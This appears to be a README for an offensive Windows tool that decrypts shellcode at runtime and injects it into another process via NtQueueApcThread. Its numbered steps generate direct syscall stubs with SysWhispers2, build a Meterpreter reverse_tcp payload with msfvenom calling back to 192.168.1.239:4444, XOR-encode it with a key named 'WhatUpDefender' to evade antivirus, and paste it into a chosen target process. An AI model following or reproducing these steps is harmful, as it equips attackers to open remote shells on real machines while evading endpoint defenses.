# ntQueueUserAPCShellcode

Shellcode decryption on runtime + execution via ntQueueUserAPC


1) Use Syswhispers2 to create your syscall files: `python3 syswhispers.py -f NtOpenThread,NtSuspendThread,NtQueueApcThread,NtResumeThread,NtOpenProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory -o syscalls_all`
2) Generate shellcode, for example -> `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin`
3) Clone the following . https://github.com/Arno0x/ShellcodeWrapper
4) `python2.7 shellcode_encoder.py -cpp meter.bin WhatUpDefender xor`
5) Paste into the shellcode section of the code.
6) Change the target process to whatever you need
